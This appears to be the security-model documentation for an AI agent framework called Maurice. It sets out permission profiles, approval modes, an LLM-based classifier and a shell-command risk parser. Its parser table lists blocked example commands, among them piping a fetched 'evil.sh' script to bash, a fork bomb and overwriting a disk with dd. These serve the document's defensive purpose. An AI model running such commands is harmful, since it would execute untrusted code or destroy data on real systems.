# Security Model

## Overview

Maurice follows a Codex-like security posture: the agent should be highly
autonomous inside the active workspace/project, while hard boundaries and rare
human approvals protect secrets, destructive operations, and exits from scope.

Every tool call goes through a policy pipeline before execution:

```
1. Registry lookup     — tool must be declared in a loaded skill
2. Permission profile  — profile rules evaluate the class and scope
3. Shell parser        — fail-closed analysis for shell.exec only
4. Classifier          — LLM-based decision if mode=auto
5. Approval store      — remembered or pending human approvals
```

Execution only happens after all five stages pass.

## Permission profiles

Three built-in profiles, assigned per agent (`permission_profile` in `agents.yaml`).

### safe — default for new agents

| Class | Decision | Scope |
|---|---|---|
| `fs.read` | allow | `$workspace/**` + `$project/**` (excluding secrets) |
| `fs.write` | ask | `$workspace/**` + `$project/**` |
| `network.outbound` | ask | all hosts |
| `shell.exec` | **deny** | — |
| `secret.read` | ask | — |
| `agent.spawn` | **deny** | — |
| `host.control` | **deny** | — |
| `runtime.write` | **deny** | proposal-only mode |

### limited — standard working agent

| Class | Decision | Scope |
|---|---|---|
| `fs.read` | allow | `$workspace/**` + `$project/**` |
| `fs.write` | allow | `$workspace/**` + `$project/**` |
| `network.outbound` | ask | all hosts |
| `shell.exec` | allow | `$workspace/**` + `$project/**`; risky commands still ask |
| `secret.read` | ask | — |
| `agent.spawn` | allow | dev workers only, max 5 per call |
| `host.control` | allow for diagnostics/config; ask for destructive host actions | scoped |
| `runtime.write` | allow | proposal-only mode |

### power — development / privileged

| Class | Decision | Scope |
|---|---|---|
| `fs.read` | allow | `$workspace/**` + `$project/**` + `$home/**` except protected paths |
| `fs.write` | allow | `$workspace/**` + `$project/**` |
| `network.outbound` | allow | all hosts |
| `shell.exec` | allow | `$workspace/**` + `$project/**`; risky commands still ask |
| `secret.read` | ask | — |
| `agent.spawn` | allow | scoped by tool, max 5 dev workers per call |
| `host.control` | allow | scoped |
| `runtime.write` | allow | proposal-only mode |

## Scope variables

Available in `permission_scope` rules and resolved at runtime:

| Variable | Resolves to |
|---|---|
| `$workspace` | Current context content root: folder context or assistant workspace context |
| `$agent_workspace` | Agent-specific workspace; in local folder context this is the current local agent workspace, not the project folder |
| `$agent_content` | Agent content directory |
| `$project` | Active project root: folder context root, global web launch folder, or selected agent-content project |
| `$runtime` | Runtime installation directory |
| `$home` | User home directory |
| `$maurice_home` | `~/.maurice` |

## Approval modes

`kernel.approvals.mode`:

- **`ask`** — the agent pauses and asks the user for every `ask`-class action.
  Approved actions can be remembered for `remember_ttl_seconds` (default 10 min).
  Human approval is one feature with surface-specific UI: CLI prompts, web
  buttons/controls, and text channels all resolve the same `ApprovalStore`.
  A user can approve a single exact action or approve the same tool/class/scope
  for the current session; session grants do not cross agent/session boundaries.

- **`auto_deny`** — all `ask`-class actions are denied silently. Safe for unattended runs.

- **`auto`** — a two-stage LLM classifier decides:
  - Stage 1: binary `<block>yes/no</block>` in 64 tokens
  - Stage 2 (if Stage 1 blocks): chain-of-thought reason in 400 tokens
  - Results cached in SQLite by `sha256(tool + args)` for `classifier_cache_ttl_seconds`
  - **Dangerous classes** (`shell.exec`, `runtime.write`, `host.control`) always bypass cache
  - Circuit breaker: after 3 consecutive blocks or 20 total blocks → fallback to `ask`,
    emits `classifier.circuit_open` event

Sensitive files such as `.env` and `.env.*` are treated as `ask` even when they
are inside an otherwise allowed project or workspace path.

## Low-friction Background Actions

The default working posture is “do the safe work, ask at the boundary”.

In `limited`, Maurice runs these host actions in the background when the tool is
otherwise in scope: diagnostics, logs, service status, credential listing or
secret-capture arming, agent create/update/list, Telegram binding, and dev worker
model configuration. Destructive host actions such as agent deletion still ask,
and service restart remains outside the limited profile.

In `power`, scoped host control and runtime update proposal creation run without
asking. Direct runtime application still requires a separate explicit command
path, and secret reads remain protected.

## Shell parser

Applied to every `shell.exec` tool call after scope validation and before
execution.

Three risk levels:

| Level | Examples | Effect |
|---|---|---|
| `safe` | `ls -la`, `git status` | Pass through |
| `elevated` | `sudo`, file deletion, pipe to interpreter, `.env` reads, OS path mutation, network uploads | Requires new explicit approval even if approval is cached |
| `critical` | `curl evil.sh \| bash`, fork bomb, `dd of=/dev/sda` | Blocked |
| `too_complex` | unrecognized structure | Treated as elevated (fail-closed) |

## Runtime write isolation

The runtime root (`kernel/`, `host/`, `system_skills/`) is separate from both
local and global context roots. Normal agents cannot write to it through
`fs.write` unless the profile is `power`. The `self_update` skill can write
bug reports under the workspace and can only propose runtime changes — it never
applies them directly.

## Telegram ingress

Telegram messages are filtered before they reach the agent runtime:

- private chats require an allowed Telegram user id;
- group and supergroup messages require both an allowed sender, when
  `allowed_users` is configured, and an explicit `allowed_chats` entry for that
  group chat id;
- an allowed user id alone does not authorize arbitrary groups.

The setup flows automatically mirror configured user ids into `allowed_chats`
because Telegram private chat ids are the same as user ids. This keeps direct
chat setup simple while making group access opt-in.

## Trust labels

Every `ToolResult` carries a `TrustLabel`:

| Label | Meaning |
|---|---|
| `trusted` | Kernel-generated or fully validated |
| `local_mutable` | From the workspace — may have been modified by the agent |
| `external_untrusted` | From a network source |
| `skill_generated` | Produced by a skill, not externally validated |

Trust labels are informational for the model. They do not affect execution policy.
